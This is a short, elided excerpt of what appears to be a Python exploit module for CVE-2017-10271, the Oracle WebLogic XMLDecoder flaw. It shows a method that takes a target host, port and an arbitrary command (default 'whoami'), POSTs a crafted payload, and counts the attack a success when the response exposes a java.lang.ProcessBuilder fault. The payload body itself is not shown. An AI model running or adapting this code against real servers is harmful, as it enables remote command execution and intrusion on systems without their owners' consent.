...
class CVE_2017_10271(Star):
    ...
    def light_up(
        self, dip, dport, force_ssl=None, cmd="whoami", *args, **kwargs
    ) -> (bool, dict):
    ...
    """.format(t_data)
        res, data = http(
            url, "POST", data=data, timeout=3, headers=headers, ssl=force_ssl
        )
        if res != None and (
            "<faultstring>java.lang.ProcessBuilder" in res.text
            or "<faultstring>0" in res.text
        ):
